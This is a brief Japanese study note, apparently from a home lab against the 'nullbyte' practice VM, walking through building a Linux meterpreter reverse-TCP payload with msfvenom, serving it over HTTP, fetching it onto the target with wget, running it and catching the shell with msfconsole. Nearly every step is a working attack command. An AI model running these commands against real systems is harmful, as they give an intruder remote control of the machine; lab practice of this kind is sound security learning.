## msfvenomの使い方(nullbyteより)
- msfvenomを使うが基本的にfirefoxの拡張機能を使う
- 始める前にスナップショットをとっておく。名前は、そのままでいい
### target
- とりあえず侵入する
  - ssh ramses@192.168.56.108 -p 777
- /tmpに移動する
- payload作成のためのサーバを調べる
  - `uname -a`
  - linuxの`i686`は32bitであるのがわかる。ちなみに64bitは`x64`or`x86_64`

### Parrot
- nullbyteのファイルに移動
- `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=自分のアドレス LPORT=4444 -a x86 -f elf -o payload.elf`
  - portの4444は空いていれば何でもいい
  - `-a`はアーキテクチャ
  - `-f`はファイルタイプ 
- `python -m http.server 8080`

### target
- `wget http://自分のアドレス:8080/payload.elf`
- `chmod +x payload.elf`

### Parrot
- `ctrl + d`で抜ける
- `msfconsole -qx "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 自分のアドレス; set LPORT 4444; run"`

### target
- `./payload.elf`

### targetをシャットダウンする時の注意点
- 電源をoffにする
- 左クリックでスナップショットを選択する
- スナップショット1を押して、上の復元ボタンを押す。するとアラートが出るのでチェックを外して復元ボタンを押す
